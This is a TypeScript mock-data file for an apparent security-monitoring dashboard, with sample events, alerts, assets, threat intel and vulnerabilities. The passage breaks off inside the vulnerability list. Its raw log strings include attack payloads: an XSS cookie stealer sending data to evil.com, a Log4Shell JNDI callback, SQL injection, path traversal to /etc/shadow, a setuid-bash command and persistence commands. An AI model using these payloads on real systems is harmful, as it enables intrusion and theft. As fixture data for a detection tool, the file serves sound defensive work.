import { subHours, subMinutes, subDays } from 'date-fns';

const now = new Date();

// ── Security Events ─────────────────────────────────────────────────────────
export type Severity = 'critical' | 'high' | 'medium' | 'low' | 'info';
export type EventType = 'intrusion' | 'malware' | 'brute_force' | 'port_scan' | 'data_exfil' | 'policy' | 'auth' | 'anomaly';

export interface SecurityEvent {
  id: string;
  timestamp: Date;
  severity: Severity;
  type: EventType;
  source: string;
  destination?: string;
  description: string;
  raw: string;
  host: string;
  user?: string;
  ruleId: string;
}

export const securityEvents: SecurityEvent[] = [
  { id: 'EVT-001', timestamp: subMinutes(now, 2), severity: 'critical', type: 'intrusion', source: '185.220.101.45', destination: '10.0.1.15', description: 'SQL Injection attempt on /api/users endpoint', raw: 'GET /api/users?id=1 OR 1=1-- HTTP/1.1', host: 'web-prod-01', user: 'anonymous', ruleId: 'R-1001' },
  { id: 'EVT-002', timestamp: subMinutes(now, 5), severity: 'critical', type: 'malware', source: '10.0.2.44', destination: '91.195.240.10', description: 'Cobalt Strike beacon detected — C2 communication', raw: 'TCP SYN 10.0.2.44:49234 -> 91.195.240.10:443 [beacon interval 60s]', host: 'ws-finance-04', user: 'jsmith', ruleId: 'R-2001' },
  { id: 'EVT-003', timestamp: subMinutes(now, 8), severity: 'high', type: 'brute_force', source: '45.33.32.156', destination: '10.0.0.22', description: 'SSH brute force — 842 failed attempts in 5 minutes', raw: 'sshd: Failed password for root from 45.33.32.156 port 51423 ssh2', host: 'bastion-01', user: 'root', ruleId: 'R-3001' },
  { id: 'EVT-004', timestamp: subMinutes(now, 12), severity: 'high', type: 'data_exfil', source: '10.0.5.99', destination: '104.21.45.67', description: 'Abnormal outbound data transfer — 4.2 GB in 10 min', raw: 'NETFLOW: 10.0.5.99 -> 104.21.45.67:443 bytes=4521890432', host: 'db-server-02', user: 'dbadmin', ruleId: 'R-4001' },
  { id: 'EVT-005', timestamp: subMinutes(now, 15), severity: 'medium', type: 'port_scan', source: '192.168.1.200', description: 'Internal port scan — 65535 ports in 30 seconds', raw: 'NMAP SYN scan from 192.168.1.200 detected by IDS signature #44221', host: 'ws-ops-07', user: 'mwilliams', ruleId: 'R-5001' },
  { id: 'EVT-006', timestamp: subMinutes(now, 18), severity: 'critical', type: 'malware', source: '10.0.3.21', description: 'Ransomware file encryption detected — .phoenix extension', raw: 'FileSystemWatcher: Mass file rename detected — 1247 files modified in /home', host: 'fs-server-01', user: 'backup_svc', ruleId: 'R-2002' },
  { id: 'EVT-007', timestamp: subMinutes(now, 22), severity: 'high', type: 'auth', source: '203.0.113.42', destination: '10.0.0.5', description: 'Impossible travel: login from Moscow 8 min after NY login', raw: 'AuthLog: user=jdoe src=203.0.113.42 (Moscow, RU) prev_src=72.14.207.33 (New York, US)', host: 'idp-01', user: 'jdoe', ruleId: 'R-6001' },
  { id: 'EVT-008', timestamp: subMinutes(now, 25), severity: 'medium', type: 'intrusion', source: '45.155.205.233', destination: '10.0.1.10', description: 'XSS payload detected in HTTP request body', raw: 'POST /comment body contains <script>document.location=\'https://evil.com/steal?c=\'+document.cookie</script>', host: 'web-prod-02', ruleId: 'R-1002' },
  { id: 'EVT-009', timestamp: subMinutes(now, 30), severity: 'high', type: 'malware', source: '10.0.4.55', description: 'Mimikatz credential dump detected (LSASS memory access)', raw: 'ProcessCreate: C:\\\\Windows\\\\Temp\\\\m.exe accessed lsass.exe (PID 596)', host: 'ws-hr-12', user: 'tgarcia', ruleId: 'R-2003' },
  { id: 'EVT-010', timestamp: subMinutes(now, 35), severity: 'low', type: 'policy', source: '10.0.2.77', description: 'USB device connected — unregistered device ID', raw: 'DeviceConnect: VID=0951 PID=1666 Serial=<none> User=kpatel', host: 'ws-eng-03', user: 'kpatel', ruleId: 'R-7001' },
  { id: 'EVT-011', timestamp: subMinutes(now, 40), severity: 'critical', type: 'intrusion', source: '193.32.126.157', destination: '10.0.1.20', description: 'CVE-2024-3400 PAN-OS zero-day exploitation attempt', raw: 'GET /api/terminals/images/..%2F..%2F..%2Fetc%2Fpasswd HTTP/1.1', host: 'fw-edge-01', ruleId: 'R-1003' },
  { id: 'EVT-012', timestamp: subMinutes(now, 45), severity: 'medium', type: 'anomaly', source: '10.0.6.33', description: 'After-hours database access — 2:47 AM local time', raw: 'DB_AUDIT: SELECT * FROM customers WHERE 1=1 LIMIT 100000 user=analytics_svc at 02:47:23', host: 'db-analytics-01', user: 'analytics_svc', ruleId: 'R-8001' },
  { id: 'EVT-013', timestamp: subMinutes(now, 50), severity: 'high', type: 'brute_force', source: '91.108.56.22', destination: '10.0.0.25', description: 'RDP brute force attack — 1204 attempts', raw: 'EventID=4625 Account: Administrator Source: 91.108.56.22:55210', host: 'rdp-gateway-01', ruleId: 'R-3002' },
  { id: 'EVT-014', timestamp: subMinutes(now, 55), severity: 'info', type: 'auth', source: '10.0.1.5', description: 'Service account logged in outside maintenance window', raw: 'EventID=4624 LogonType=3 Account=svc_backup Source=10.0.1.5', host: 'dc-01', user: 'svc_backup', ruleId: 'R-6002' },
  { id: 'EVT-015', timestamp: subHours(now, 1), severity: 'critical', type: 'data_exfil', source: '10.0.7.88', destination: '185.220.101.34', description: 'Large DNS TXT record exfiltration (DNS tunneling detected)', raw: 'DNS: TXT query for a1b2c3d4e5.exfil.attacker.com from 10.0.7.88 (512 bytes)', host: 'ws-dev-09', user: 'contractor_01', ruleId: 'R-4002' },
  { id: 'EVT-016', timestamp: subHours(now, 1.2), severity: 'medium', type: 'port_scan', source: '198.51.100.23', description: 'External reconnaissance — OS fingerprinting detected', raw: 'IDS ALERT: Nmap OS detection scan from 198.51.100.23 against 10.0.0.0/24', host: 'ids-sensor-01', ruleId: 'R-5002' },
  { id: 'EVT-017', timestamp: subHours(now, 1.5), severity: 'high', type: 'malware', source: '10.0.3.44', description: 'PowerShell Empire stager detected — encoded payload', raw: 'PowerShell -Enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0AA==', host: 'ws-exec-02', user: 'ceo_pa', ruleId: 'R-2004' },
  { id: 'EVT-018', timestamp: subHours(now, 2), severity: 'low', type: 'policy', source: '10.0.2.15', description: 'Firewall rule modification by non-admin user', raw: 'AuditLog: fw-rule DELETE id=445 user=helpdesk_01 src_ip=10.0.2.15', host: 'fw-internal-02', user: 'helpdesk_01', ruleId: 'R-7002' },
  { id: 'EVT-019', timestamp: subHours(now, 2.5), severity: 'critical', type: 'intrusion', source: '5.188.86.172', destination: '10.0.0.10', description: 'Log4Shell (CVE-2021-44228) exploitation detected', raw: '${jndi:ldap://5.188.86.172:1389/Exploit} in User-Agent header', host: 'app-server-03', ruleId: 'R-1004' },
  { id: 'EVT-020', timestamp: subHours(now, 3), severity: 'medium', type: 'anomaly', source: '10.0.5.66', description: 'Privilege escalation via sudo command injection', raw: 'sudo: user=devops01 command=/bin/bash -c "chmod 4777 /bin/bash"', host: 'linux-dev-04', user: 'devops01', ruleId: 'R-8002' },
  { id: 'EVT-021', timestamp: subHours(now, 3.5), severity: 'high', type: 'malware', source: '10.0.4.12', description: 'WannaCry ransomware lateral movement — SMB exploit', raw: 'MS17-010 EternalBlue exploit payload detected on port 445', host: 'ws-legacy-01', ruleId: 'R-2005' },
  { id: 'EVT-022', timestamp: subHours(now, 4), severity: 'medium', type: 'brute_force', source: '185.234.218.45', description: 'WordPress admin panel brute force — 338 attempts', raw: 'POST /wp-login.php 200 attempts=338 lockout=true', host: 'web-wordpress-01', ruleId: 'R-3003' },
  { id: 'EVT-023', timestamp: subHours(now, 4.5), severity: 'high', type: 'data_exfil', source: '10.0.8.33', description: 'Sensitive file access — PCI data read by unauthorized user', raw: 'FileAudit: READ /data/pci/cardholders.csv user=intern_02 (not in ACL)', host: 'fs-secure-01', user: 'intern_02', ruleId: 'R-4003' },
  { id: 'EVT-024', timestamp: subHours(now, 5), severity: 'info', type: 'policy', source: '10.0.1.88', description: 'New admin account created outside change window', raw: 'EventID=4720 New User: svc_new_2024 Created by: jsmith', host: 'dc-02', user: 'jsmith', ruleId: 'R-7003' },
  { id: 'EVT-025', timestamp: subHours(now, 6), severity: 'critical', type: 'intrusion', source: '89.248.165.43', destination: '10.0.1.5', description: 'Remote code execution via Confluence CVE-2023-22518', raw: 'POST /json/setup-restore.action HTTP/1.1 (unauthenticated)', host: 'confluence-01', ruleId: 'R-1005' },
  { id: 'EVT-026', timestamp: subHours(now, 7), severity: 'medium', type: 'anomaly', source: '10.0.9.44', description: 'Unusual process spawn — cmd.exe child of Office process', raw: 'PROC: winword.exe (PID 2344) spawned cmd.exe -> powershell.exe', host: 'ws-sales-06', user: 'bwilson', ruleId: 'R-8003' },
  { id: 'EVT-027', timestamp: subHours(now, 8), severity: 'high', type: 'auth', source: '10.0.3.77', description: 'Golden Ticket attack — Kerberos anomaly detected', raw: 'KRB5: TGT lifetime > 20h for krbtgt — possible Golden Ticket', host: 'dc-01', ruleId: 'R-6003' },
  { id: 'EVT-028', timestamp: subHours(now, 9), severity: 'low', type: 'port_scan', source: '10.0.2.55', description: 'Internal host scanning web services (8080, 8443, 8888)', raw: 'IDS: TCP SYN to 10.0.0.0/24:8080,8443,8888 from 10.0.2.55', host: 'ws-qa-02', user: 'qabot', ruleId: 'R-5003' },
  { id: 'EVT-029', timestamp: subHours(now, 10), severity: 'critical', type: 'malware', source: '10.0.5.21', description: 'BlackCat/ALPHV ransomware binary detected on disk', raw: 'AV: HEUR/AGEN.1305854 detected in C:\\\\Users\\\\Public\\\\svchost32.exe', host: 'ws-finance-09', user: 'lchen', ruleId: 'R-2006' },
  { id: 'EVT-030', timestamp: subHours(now, 12), severity: 'high', type: 'data_exfil', source: '10.0.6.14', description: 'SMTP data exfiltration — 200MB attachment to external', raw: 'SMTP: FROM=hr_system@corp.com TO=personal@gmail.com SIZE=209715200', host: 'mail-relay-01', user: 'hr_system', ruleId: 'R-4004' },
  { id: 'EVT-031', timestamp: subHours(now, 14), severity: 'medium', type: 'intrusion', source: '192.241.221.79', description: 'SSRF attempt via forged Host header', raw: 'GET / HTTP/1.1 Host: 169.254.169.254 (AWS metadata endpoint)', host: 'web-prod-03', ruleId: 'R-1006' },
  { id: 'EVT-032', timestamp: subHours(now, 16), severity: 'high', type: 'malware', source: '10.0.7.44', description: 'DarkComet RAT beacon — persistent outbound connection', raw: 'TCP ESTABLISHED 10.0.7.44:52445 -> 176.111.174.26:1604 (DarkComet)', host: 'ws-design-01', user: 'mlee', ruleId: 'R-2007' },
  { id: 'EVT-033', timestamp: subHours(now, 18), severity: 'low', type: 'policy', source: '10.0.1.99', description: 'Unencrypted credential in config file detected', raw: 'SAST: password=P@ssw0rd123 in /opt/app/config.yml line 47', host: 'app-server-02', ruleId: 'R-7004' },
  { id: 'EVT-034', timestamp: subHours(now, 20), severity: 'critical', type: 'auth', source: '45.155.205.100', description: 'Admin panel accessed from Tor exit node', raw: 'AuthLog: admin login from 45.155.205.100 (Tor Exit: tor.dan.me.uk)', host: 'admin-portal-01', ruleId: 'R-6004' },
  { id: 'EVT-035', timestamp: subHours(now, 22), severity: 'medium', type: 'anomaly', source: '10.0.4.88', description: 'Scheduled task created for persistence', raw: 'schtasks /create /tn WindowsUpdate /tr C:\\\\Temp\\\\payload.exe /sc ONLOGON', host: 'ws-it-05', user: 'it_admin', ruleId: 'R-8004' },
  { id: 'EVT-036', timestamp: subHours(now, 23), severity: 'high', type: 'intrusion', source: '91.195.240.117', description: 'Path traversal in REST API — /../../etc/shadow read', raw: 'GET /api/files/../../../etc/shadow HTTP/1.1 -> 200 OK', host: 'api-gateway-01', ruleId: 'R-1007' },
  { id: 'EVT-037', timestamp: subDays(now, 1), severity: 'info', type: 'auth', source: '10.0.0.5', description: 'Bulk password reset — 47 users reset by 1 admin', raw: 'AD_AUDIT: PasswordReset x47 by admin_jones in 3 minutes', host: 'dc-01', user: 'admin_jones', ruleId: 'R-6005' },
  { id: 'EVT-038', timestamp: subDays(now, 1), severity: 'critical', type: 'data_exfil', source: '10.0.3.55', description: 'Source code repository cloned to personal device', raw: 'GIT: git clone ssh://git@github.com/corp/proprietary.git -> 192.168.50.100', host: 'ws-dev-15', user: 'ex_employee', ruleId: 'R-4005' },
  { id: 'EVT-039', timestamp: subDays(now, 1), severity: 'medium', type: 'malware', source: '10.0.2.33', description: 'Suspicious AutoRun registry key modification', raw: 'REG: HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run <- C:\\\\Temp\\\\svc.exe', host: 'ws-ops-12', user: 'ops_03', ruleId: 'R-2008' },
  { id: 'EVT-040', timestamp: subDays(now, 1), severity: 'high', type: 'brute_force', source: '196.245.163.99', description: 'OWA (Outlook Web App) password spray attack', raw: 'EWS: 892 auth failures across 156 accounts from 196.245.163.99', host: 'mail-01', ruleId: 'R-3004' },
];

// ── 24h Timeline data ────────────────────────────────────────────────────────
export const timelineData = Array.from({ length: 24 }, (_, i) => ({
  hour: `${String(23 - i).padStart(2, '0')}:00`,
  total: Math.floor(Math.random() * 180 + 40),
  critical: Math.floor(Math.random() * 25 + 2),
})).reverse();

// ── Severity distribution ────────────────────────────────────────────────────
export const severityDist = [
  { name: 'Critical', value: 12, color: '#ef4444' },
  { name: 'High', value: 18, color: '#f97316' },
  { name: 'Medium', value: 24, color: '#eab308' },
  { name: 'Low', value: 8, color: '#22c55e' },
  { name: 'Info', value: 5, color: '#3b82f6' },
];

// ── Alerts ───────────────────────────────────────────────────────────────────
export type AlertStatus = 'open' | 'acknowledged' | 'investigating' | 'resolved' | 'closed';

export interface Alert {
  id: string;
  timestamp: Date;
  title: string;
  description: string;
  severity: Severity;
  status: AlertStatus;
  mitre: string;
  mitreId: string;
  affectedHosts: string[];
  assignee?: string;
  notes: string[];
  eventCount: number;
}

export const alerts: Alert[] = [
  { id: 'ALT-001', timestamp: subMinutes(now, 10), title: 'Cobalt Strike C2 Beacon', description: 'Persistent C2 channel detected with beacon jitter. Multiple hosts may be compromised.', severity: 'critical', status: 'investigating', mitre: 'Command and Control', mitreId: 'T1071.001', affectedHosts: ['ws-finance-04', 'ws-finance-09'], assignee: 'analyst1', notes: ['Initial containment applied', 'Network isolated'], eventCount: 23 },
  { id: 'ALT-002', timestamp: subMinutes(now, 35), title: 'Ransomware Encryption Campaign', description: 'Active ransomware encrypting files across file servers. Immediate containment required.', severity: 'critical', status: 'open', mitre: 'Impact', mitreId: 'T1486', affectedHosts: ['fs-server-01', 'fs-server-02'], notes: [], eventCount: 8 },
  { id: 'ALT-003', timestamp: subHours(now, 1), title: 'SSH Brute Force — Sustained Attack', description: '842+ failed SSH attempts from single IP. Account lockout triggered.', severity: 'high', status: 'acknowledged', mitre: 'Credential Access', mitreId: 'T1110.001', affectedHosts: ['bastion-01'], assignee: 'analyst2', notes: ['IP blocked at perimeter'], eventCount: 15 },
  { id: 'ALT-004', timestamp: subHours(now, 2), title: 'Impossible Travel Detected', description: 'User jdoe authenticated from New York then Moscow within 8 minutes.', severity: 'high', status: 'investigating', mitre: 'Initial Access', mitreId: 'T1078', affectedHosts: ['idp-01'], assignee: 'analyst1', notes: ['User account suspended', 'Password reset pending'], eventCount: 3 },
  { id: 'ALT-005', timestamp: subHours(now, 3), title: 'Mimikatz Credential Dumping', description: 'LSASS memory access detected — credential harvesting in progress.', severity: 'critical', status: 'resolved', mitre: 'Credential Access', mitreId: 'T1003.001', affectedHosts: ['ws-hr-12'], assignee: 'analyst3', notes: ['Host isolated', 'Credentials rotated', 'Memory forensics complete'], eventCount: 4 },
  { id: 'ALT-006', timestamp: subHours(now, 4), title: 'DNS Tunneling / Data Exfiltration', description: 'Encoded data transferred via DNS TXT records to external resolver.', severity: 'critical', status: 'open', mitre: 'Exfiltration', mitreId: 'T1048.003', affectedHosts: ['ws-dev-09'], notes: [], eventCount: 31 },
  { id: 'ALT-007', timestamp: subHours(now, 6), title: 'PowerShell Empire Stager', description: 'Encoded PowerShell command executed — Empire framework detected.', severity: 'high', status: 'open', mitre: 'Execution', mitreId: 'T1059.001', affectedHosts: ['ws-exec-02'], notes: [], eventCount: 7 },
  { id: 'ALT-008', timestamp: subHours(now, 8), title: 'Golden Ticket Attack', description: 'Kerberos TGT with anomalous lifetime detected — domain may be fully compromised.', severity: 'critical', status: 'acknowledged', mitre: 'Privilege Escalation', mitreId: 'T1558.001', affectedHosts: ['dc-01'], assignee: 'analyst2', notes: ['CISO notified', 'Forensics team engaged'], eventCount: 2 },
  { id: 'ALT-009', timestamp: subHours(now, 12), title: 'Log4Shell Exploitation', description: 'Active CVE-2021-44228 exploitation on Confluence server.', severity: 'critical', status: 'closed', mitre: 'Initial Access', mitreId: 'T1190', affectedHosts: ['app-server-03', 'confluence-01'], assignee: 'analyst3', notes: ['Patched', 'No lateral movement confirmed', 'Post-incident report filed'], eventCount: 19 },
  { id: 'ALT-010', timestamp: subHours(now, 18), title: 'Insider Threat — Source Code Exfil', description: 'Terminated employee cloned proprietary repo to personal device.', severity: 'high', status: 'investigating', mitre: 'Exfiltration', mitreId: 'T1537', affectedHosts: ['ws-dev-15'], assignee: 'analyst1', notes: ['Legal notified', 'Device seizure initiated'], eventCount: 5 },
];

// ── Assets ───────────────────────────────────────────────────────────────────
export type AssetType = 'server' | 'workstation' | 'network' | 'cloud' | 'iot';
export type AssetStatus = 'online' | 'offline' | 'warning';
export type OS = 'Windows Server' | 'Ubuntu' | 'CentOS' | 'Windows 11' | 'macOS' | 'Cisco IOS' | 'Windows 10' | 'RHEL';

export interface Asset {
  id: string;
  hostname: string;
  ip: string;
  os: OS;
  type: AssetType;
  status: AssetStatus;
  riskScore: number;
  agentVersion: string;
  lastSeen: Date;
  tags: string[];
  owner: string;
  location: string;
}

export const assets: Asset[] = [
  { id: 'AST-001', hostname: 'dc-01', ip: '10.0.0.5', os: 'Windows Server', type: 'server', status: 'online', riskScore: 92, agentVersion: '4.8.1', lastSeen: subMinutes(now, 1), tags: ['domain-controller', 'critical'], owner: 'IT Ops', location: 'DC1-Rack-A01' },
  { id: 'AST-002', hostname: 'web-prod-01', ip: '10.0.1.15', os: 'Ubuntu', type: 'server', status: 'online', riskScore: 67, agentVersion: '4.8.1', lastSeen: subMinutes(now, 2), tags: ['web', 'dmz'], owner: 'DevOps', location: 'DC1-Rack-B03' },
  { id: 'AST-003', hostname: 'db-server-02', ip: '10.0.2.30', os: 'CentOS', type: 'server', status: 'online', riskScore: 81, agentVersion: '4.7.9', lastSeen: subMinutes(now, 3), tags: ['database', 'pci'], owner: 'DBA Team', location: 'DC1-Rack-C05' },
  { id: 'AST-004', hostname: 'ws-finance-04', ip: '10.0.2.44', os: 'Windows 11', type: 'workstation', status: 'warning', riskScore: 95, agentVersion: '4.8.1', lastSeen: subMinutes(now, 5), tags: ['finance', 'compromised'], owner: 'Finance Dept', location: 'HQ-Floor3' },
  { id: 'AST-005', hostname: 'bastion-01', ip: '10.0.0.22', os: 'Ubuntu', type: 'server', status: 'online', riskScore: 44, agentVersion: '4.8.1', lastSeen: subMinutes(now, 1), tags: ['bastion', 'ssh'], owner: 'IT Ops', location: 'DC1-DMZ' },
  { id: 'AST-006', hostname: 'ws-hr-12', ip: '10.0.4.55', os: 'Windows 10', type: 'workstation', status: 'offline', riskScore: 88, agentVersion: '4.8.0', lastSeen: subHours(now, 2), tags: ['hr', 'isolated'], owner: 'HR Dept', location: 'HQ-Floor2' },
  { id: 'AST-007', hostname: 'fw-edge-01', ip: '10.0.0.1', os: 'Cisco IOS', type: 'network', status: 'online', riskScore: 55, agentVersion: '4.6.2', lastSeen: subMinutes(now, 1), tags: ['firewall', 'perimeter'], owner: 'NetOps', location: 'DC1-Rack-A01' },
  { id: 'AST-008', hostname: 'ws-exec-02', ip: '10.0.3.44', os: 'macOS', type: 'workstation', status: 'warning', riskScore: 78, agentVersion: '4.8.1', lastSeen: subMinutes(now, 8), tags: ['executive', 'vip'], owner: 'Executive', location: 'HQ-Exec-Floor' },
  { id: 'AST-009', hostname: 'confluence-01', ip: '10.0.1.20', os: 'Ubuntu', type: 'server', status: 'online', riskScore: 72, agentVersion: '4.8.1', lastSeen: subMinutes(now, 2), tags: ['atlassian', 'collaboration'], owner: 'IT Ops', location: 'DC1-Rack-B07' },
  { id: 'AST-010', hostname: 'mail-01', ip: '10.0.0.25', os: 'Windows Server', type: 'server', status: 'online', riskScore: 61, agentVersion: '4.8.1', lastSeen: subMinutes(now, 1), tags: ['email', 'exchange'], owner: 'IT Ops', location: 'DC1-Rack-A04' },
  { id: 'AST-011', hostname: 'app-server-03', ip: '10.0.1.10', os: 'RHEL', type: 'server', status: 'online', riskScore: 58, agentVersion: '4.8.1', lastSeen: subMinutes(now, 3), tags: ['application', 'java'], owner: 'DevOps', location: 'DC2-Rack-A01' },
  { id: 'AST-012', hostname: 'ws-dev-09', ip: '10.0.5.99', os: 'macOS', type: 'workstation', status: 'warning', riskScore: 83, agentVersion: '4.8.1', lastSeen: subMinutes(now, 15), tags: ['developer', 'exfil'], owner: 'Engineering', location: 'HQ-Floor4' },
];

// ── Threat Intel ─────────────────────────────────────────────────────────────
export type IOCType = 'ip' | 'domain' | 'md5' | 'sha256' | 'url' | 'email';
export type ThreatCategory = 'malware' | 'phishing' | 'c2' | 'ransomware' | 'botnet' | 'apt' | 'exploit';

export interface ThreatIntel {
  id: string;
  ioc: string;
  type: IOCType;
  category: ThreatCategory;
  confidence: number;
  active: boolean;
  source: string;
  firstSeen: Date;
  lastSeen: Date;
  tags: string[];
  description: string;
}

export const threatIntel: ThreatIntel[] = [
  { id: 'TI-001', ioc: '91.195.240.10', type: 'ip', category: 'c2', confidence: 98, active: true, source: 'Mandiant', firstSeen: subDays(now, 30), lastSeen: subHours(now, 2), tags: ['cobalt-strike', 'apt29'], description: 'Cobalt Strike C2 server linked to APT29 (Cozy Bear)' },
  { id: 'TI-002', ioc: '185.220.101.45', type: 'ip', category: 'malware', confidence: 91, active: true, source: 'Shodan', firstSeen: subDays(now, 15), lastSeen: subMinutes(now, 30), tags: ['scanner', 'exploit'], description: 'Mass exploitation scanning host — Tor exit relay' },
  { id: 'TI-003', ioc: 'exfil.attacker.com', type: 'domain', category: 'c2', confidence: 95, active: true, source: 'Recorded Future', firstSeen: subDays(now, 7), lastSeen: subHours(now, 1), tags: ['dns-tunnel', 'exfil'], description: 'DNS tunneling C2 domain used for data exfiltration' },
  { id: 'TI-004', ioc: '5a4b3c2d1e0f9a8b7c6d5e4f3a2b1c0d', type: 'md5', category: 'ransomware', confidence: 99, active: true, source: 'VirusTotal', firstSeen: subDays(now, 45), lastSeen: subDays(now, 2), tags: ['blackcat', 'alphv', 'ransomware'], description: 'BlackCat/ALPHV ransomware binary — v3.1' },
  { id: 'TI-005', ioc: 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2', type: 'sha256', category: 'malware', confidence: 87, active: true, source: 'CrowdStrike', firstSeen: subDays(now, 20), lastSeen: subDays(now, 5), tags: ['mimikatz', 'credential-dump'], description: 'Mimikatz variant with AMSI bypass' },
  { id: 'TI-006', ioc: 'phish-corporate.evil-domain.net', type: 'domain', category: 'phishing', confidence: 93, active: true, source: 'PhishTank', firstSeen: subDays(now, 3), lastSeen: subHours(now, 4), tags: ['spearphish', 'credential-harvest'], description: 'Spear phishing site mimicking corporate SSO portal' },
  { id: 'TI-007', ioc: 'http://update.windefender-patch.com/payload.exe', type: 'url', category: 'malware', confidence: 96, active: true, source: 'URLhaus', firstSeen: subDays(now, 10), lastSeen: subHours(now, 6), tags: ['dropper', 'fake-update'], description: 'Fake Windows Defender update distributing trojan dropper' },
  { id: 'TI-008', ioc: 'hr-noreply@corp-payroll-update.com', type: 'email', category: 'phishing', confidence: 88, active: true, source: 'Internal', firstSeen: subDays(now, 5), lastSeen: subDays(now, 1), tags: ['bec', 'payroll-fraud'], description: 'BEC phishing sender — payroll diversion attempt' },
  { id: 'TI-009', ioc: '45.33.32.156', type: 'ip', category: 'botnet', confidence: 77, active: false, source: 'Spamhaus', firstSeen: subDays(now, 60), lastSeen: subDays(now, 14), tags: ['mirai', 'ddos'], description: 'Mirai botnet node — historical SSH scanner' },
  { id: 'TI-010', ioc: '176.111.174.26', type: 'ip', category: 'c2', confidence: 82, active: true, source: 'AlienVault OTX', firstSeen: subDays(now, 25), lastSeen: subHours(now, 12), tags: ['darkcomet', 'rat'], description: 'DarkComet RAT C2 server — active campaign' },
  { id: 'TI-011', ioc: 'ransomware-decrypt.onion', type: 'domain', category: 'ransomware', confidence: 91, active: true, source: 'Darkweb Monitor', firstSeen: subDays(now, 90), lastSeen: subDays(now, 3), tags: ['lockbit', 'payment'], description: 'LockBit 3.0 ransom payment portal on Tor' },
  { id: 'TI-012', ioc: '9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08', type: 'sha256', category: 'apt', confidence: 94, active: true, source: 'CISA Advisory', firstSeen: subDays(now, 120), lastSeen: subDays(now, 10), tags: ['apt41', 'supply-chain'], description: 'APT41 supply chain attack payload — signed binary' },
];

// ── FIM Events ───────────────────────────────────────────────────────────────
export type FIMChangeType = 'created' | 'modified' | 'deleted' | 'permission_changed' | 'owner_changed';

export interface FIMEvent {
  id: string;
  timestamp: Date;
  host: string;
  path: string;
  changeType: FIMChangeType;
  severity: Severity;
  user: string;
  hashOld?: string;
  hashNew?: string;
  acknowledged: boolean;
  whitelisted: boolean;
}

export const fimEvents: FIMEvent[] = [
  { id: 'FIM-001', timestamp: subMinutes(now, 15), host: 'bastion-01', path: '/etc/passwd', changeType: 'modified', severity: 'critical', user: 'root', hashOld: 'a1b2c3d4e5f6789012345678abcdef01', hashNew: 'deadbeef1234567890abcdef12345678', acknowledged: false, whitelisted: false },
  { id: 'FIM-002', timestamp: subMinutes(now, 28), host: 'bastion-01', path: '/etc/sudoers', changeType: 'modified', severity: 'critical', user: 'devops01', hashOld: '0f1e2d3c4b5a69788796a5b4c3d2e1f0', hashNew: 'f0e1d2c3b4a596870a9b8c7d6e5f4a3b', acknowledged: false, whitelisted: false },
  { id: 'FIM-003', timestamp: subHours(now, 1), host: 'ws-finance-04', path: 'C:\\Windows\\System32\\drivers\\etc\\hosts', changeType: 'modified', severity: 'high', user: 'SYSTEM', hashOld: '1a2b3c4d5e6f708192a3b4c5d6e7f8a9', hashNew: '9f8e7d6c5b4a3021a9b8c7d6e5f4a3b2', acknowledged: false, whitelisted: false },
  { id: 'FIM-004', timestamp: subHours(now, 2), host: 'dc-01', path: 'C:\\Windows\\System32\\lsass.exe', changeType: 'modified', severity: 'critical', user: 'SYSTEM', hashOld: '4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a', hashNew: 'b1c2d3e4f5a60718293a4b5c6d7e8f9a', acknowledged: true, whitelisted: false },
  { id: 'FIM-005', timestamp: subHours(now, 3), host: 'web-prod-01', path: '/var/www/html/index.php', changeType: 'created', severity: 'high', user: 'www-data', hashOld: undefined, hashNew: 'c3d4e5f6a7b80921a3b4c5d6e7f8a9b0', acknowledged: false, whitelisted: false },
  { id: 'FIM-006', timestamp: subHours(now, 4), host: 'linux-dev-04', path: '/etc/crontab', changeType: 'modified', severity: 'medium', user: 'devops01', hashOld: '5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b', hashNew: 'a0b1c2d3e4f506172839a0b1c2d3e4f5', acknowledged: false, whitelisted: false },
  { id: 'FIM-007', timestamp: subHours(now, 5), host: 'db-server-02', path: '/etc/ssh/sshd_config', changeType: 'permission_changed', severity: 'medium', user: 'dbadmin', hashOld: '6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c', hashNew: '6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c', acknowledged: true, whitelisted: false },
  { id: 'FIM-008', timestamp: subHours(now, 8), host: 'app-server-03', path: '/opt/app/config.yml', changeType: 'modified', severity: 'medium', user: 'deploy_bot', hashOld: '7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d', hashNew: '2d3e4f5a6b7c8091a2b3c4d5e6f7a8b9', acknowledged: false, whitelisted: false },
  { id: 'FIM-009', timestamp: subHours(now, 10), host: 'ws-hr-12', path: 'C:\\Users\\tgarcia\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\svc.exe', changeType: 'created', severity: 'critical', user: 'tgarcia', hashOld: undefined, hashNew: 'e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9', acknowledged: false, whitelisted: false },
  { id: 'FIM-010', timestamp: subHours(now, 12), host: 'bastion-01', path: '/root/.ssh/authorized_keys', changeType: 'owner_changed', severity: 'critical', user: 'unknown', hashOld: '0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a', hashNew: '0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f5a', acknowledged: false, whitelisted: false },
];

// ── Vulnerabilities ──────────────────────────────────────────────────────────
export type VulnStatus = 'open' | 'patched' | 'mitigated' | 'accepted';

export interface Vulnerability {
  id: string;
  cve: string;
  title: string;
  cvss: number;
  severity: Severity;
  affectedProduct: string;
  affectedHosts: string[];
  status: VulnStatus;
  exploitAvailable: boolean;
  published: Date;
  patchAvailable: boolean;
  description: string;
}

export const vulnerabilities: Vulnerability[] = [
  { id: 'VUL-001', cve: 'CVE-2024-3094', title: 'XZ Utils Backdoor', cvss: 10.0, severity: 'critical', affectedProduct: 'XZ Utils 5.6.0-5.6.1', affectedHosts: ['bastion-01', 'web-prod-01'], status: 'patched', exploitAvailable: true, published: subDays(now, 180), patchAvailable: true, description: 'Backdoor inserted into XZ Utils compression library by malicious contributor. Allows remote code execution via SSH.' },
